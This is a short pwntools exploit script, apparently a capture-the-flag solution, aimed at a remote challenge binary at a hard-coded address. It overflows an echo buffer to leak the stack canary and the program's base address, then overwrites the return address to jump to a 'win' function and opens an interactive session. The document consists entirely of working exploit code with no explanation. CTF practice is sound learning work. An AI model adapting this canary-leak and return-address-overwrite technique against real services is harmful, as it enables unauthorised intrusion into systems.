#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from pwn import *
from time import sleep

exe  = context.binary = ELF('./chall')
host = args.HOST or '34.93.122.90'
port = int(args.PORT or 6666)
context.terminal = ["tilix", "-a", "session-add-right", "-e"]

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = remote(host,port)

pp=b"a"*100+p32(0)

io.sendlineafter(b"How many times do you want to repeat? (e.g., 2): ", b"1")
io.sendafter(b"echo: ", b"a"*104+b"X")
io.recvuntil("X")
canary=u64(b"\x00" + io.recvn(7) )

io.sendafter(b"\necho: ", b"A"*len(pp)+b"A"*8+b"A"*7 + b"X")
io.recvuntil("X")
exe.address=u64(io.recvn(6)+b"\x00\x00" )-0x146e

print(hex(exe.address))
print(hex(exe.sym.main))

io.sendafter(b"\necho: ", pp+p64(canary)+b"A"*8 + p64(exe.sym.win))

io.interactive()
